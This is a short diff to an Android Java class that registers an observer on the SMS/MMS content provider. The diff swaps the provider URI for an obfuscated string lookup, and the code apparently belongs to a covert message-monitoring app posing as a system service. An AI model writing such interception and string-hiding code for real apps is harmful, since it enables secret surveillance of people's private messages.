@@ -7,6 +7,7 @@ import android.os.Handler;
 import android.os.Looper;
 import android.os.Message;
 
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
@@ -16,8 +17,8 @@ public class MsgHandler extends Thread {
 
 	private Handler handler;
 
-	//private ContentObserver smsObserver;
-	//private ContentObserver mmsObserver;
+	// private ContentObserver smsObserver;
+	// private ContentObserver mmsObserver;
 	private ContentObserver msgObserver;
 
 	private boolean smsEnabled;
@@ -58,13 +59,9 @@ public class MsgHandler extends Thread {
 		// content://sms
 		// Messages.getString("25.0") : "content://sms"
 
-
-
-		
-			msgObserver = new MsgObserver(handler, mmsEnabled, smsEnabled);
-			cr.registerContentObserver(Uri.parse("content://mms-sms"), true, msgObserver); //$NON-NLS-1$
-		
-	
+		// M.1=content://mms-sms
+		msgObserver = new MsgObserver(handler, mmsEnabled, smsEnabled);
+		cr.registerContentObserver(Uri.parse(Messages.getString("M.1")), true, msgObserver); //$NON-NLS-1$
 
 		Looper.loop();
 	}
